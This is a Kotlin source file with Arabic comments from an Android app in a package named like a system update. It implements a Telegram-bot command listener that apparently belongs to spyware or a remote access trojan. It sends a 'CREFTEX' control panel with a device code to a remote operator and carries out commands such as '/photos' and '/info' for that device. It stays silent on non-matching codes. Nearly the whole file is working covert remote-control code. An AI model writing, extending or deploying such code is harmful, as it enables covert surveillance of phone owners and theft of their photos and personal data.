package com.sys.update2

import android.content.Context
import android.util.Log
import org.json.JSONObject
import kotlin.concurrent.thread

object CommandListener {

    private var running = false
    private var worker: Thread? = null
    private var offset = 0L

    // أوامر عامة بدون رمز جهاز
    private val PUBLIC_COMMANDS = setOf(
        "/start", "/menu", "/help", "menu", "help", "مساعدة",
        "🏠 القائمة", "📱 قائمة الأجهزة", "🌐 كل الأجهزة"
    )

    fun start(ctx: Context) {
        if (running) return
        running = true

        Log.d("CmdListener", "Starting...")

        // استرجع الـ offset من الذاكرة
        val prefs = ctx.getSharedPreferences("cmd_prefs", Context.MODE_PRIVATE)
        offset = prefs.getLong("offset", 0L)

        // ⭐ رسالة ترحيب فيها رمز الجهاز
        try {
            val code = DeviceManager.getDeviceCode(ctx)
            val name = DeviceManager.getDeviceName(ctx)
            TelegramApi.sendMessage(
                "🎛 *لوحة التحكم — CREFTEX*\n\n" +
                "🏷 *الجهاز:* $name\n" +
                "🆔 *الرمز:* `$code`\n\n" +
                "استخدم الرمز مع كل أمر:\n" +
                "`/photos $code`\n" +
                "`/info $code`",
                KeyboardBuilder.replyKeyboard(ctx)
            )
        } catch (e: Exception) {
            Log.e("CmdListener", "Menu send err: ${e.message}")
        }

        worker = thread(name = "telegram-poll") {
            while (running) {
                try {
                    poll(ctx)
                } catch (e: Exception) {
                    Log.e("CmdListener", "poll err: ${e.message}")
                    Thread.sleep(2000)
                }
            }
        }
    }

    fun stop() {
        running = false
        worker?.interrupt()
        worker = null
    }

    private fun poll(ctx: Context) {
        try {
            val updates = TelegramApi.getUpdates(offset)
            if (updates == null) {
                Thread.sleep(2000)
                return
            }
            if (updates.length() == 0) {
                return  // long polling داخل getUpdates
            }
            for (i in 0 until updates.length()) {
                val update = updates.optJSONObject(i) ?: continue
                val updateId = update.optLong("update_id", 0)
                offset = updateId + 1
                // حفظ الـ offset
                try {
                    ctx.getSharedPreferences("cmd_prefs", Context.MODE_PRIVATE)
                        .edit().putLong("offset", offset).apply()
                } catch (_: Exception) {}
                processUpdate(ctx, update)
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "poll err: ${e.message}")
            Thread.sleep(3000)
        }
    }

    private fun processUpdate(ctx: Context, update: JSONObject) {
        try {
            update.optJSONObject("callback_query")?.let { cb ->
                val cbId = cb.optString("id", "")
                TelegramApi.answerCallback(cbId)
                return
            }
            update.optJSONObject("message")?.let { msg ->
                val text = msg.optString("text", "").trim()
                if (text.isNotBlank()) handleCommand(ctx, text)
            }
        } catch (e: Exception) {
            Log.e("CmdListener", "process err: ${e.message}")
        }
    }

    /**
     * منطق التحقق من الرمز:
     * - أوامر عامة (menu, devices) → تنفذ بدون رمز
     * - أوامر خاصة → لازم تكون بالشكل: <أمر> <رمز>
     * - لو الرمز مش مطابق → تجاهل تام (بدون رد)
     */
    private fun handleCommand(ctx: Context, text: String) {
        val trimmed = text.trim()

        // 1. أوامر عامة
        if (PUBLIC_COMMANDS.contains(trimmed)) {
            CommandExecutor.handlePublic(ctx, trimmed)
            return
        }

        // 2. استخرج الرمز
        val parsed = parseCodeFromCommand(trimmed)
        if (parsed == null) {
            // مفيش رمز — نتجاهل تماماً (بدون رد)
            Log.d("CmdListener", "no code, ignoring: $trimmed")
            return
        }

        val (command, code) = parsed

        // 3. تحقق من الرمز
        if (!DeviceManager.isMyCode(ctx, code)) {
            // الرمز مش بتاعنا — نتجاهل تماماً
            Log.d("CmdListener", "code mismatch, ignoring: $code")
            return
        }

        // 4. الرمز صح — نفّذ
        CommandExecutor.handleText(ctx, command, code)
    }

    /**
     * يستخرج (الأمر، الرمز) من نص الأمر
     * يدعم:
     *   /photos A7K9M2
     *   📸 كل الصور A7K9M2
     *   /photos@MyBot A7K9M2
     */
    private fun parseCodeFromCommand(text: String): Pair<String, String>? {
        val parts = text.split(Regex("\\s+")).filter { it.isNotBlank() }
        if (parts.size < 2) return null

        // آخر جزء = الرمز
        val code = parts.last()
        // لازم يكون 6 أحرف أبجدية رقمية
        if (!code.matches(Regex("^[A-Z0-9]{6,8}$", RegexOption.IGNORE_CASE))) return null

        val command = parts.dropLast(1).joinToString(" ").trim()
        if (command.isBlank()) return null

        return Pair(command, code)
    }
}
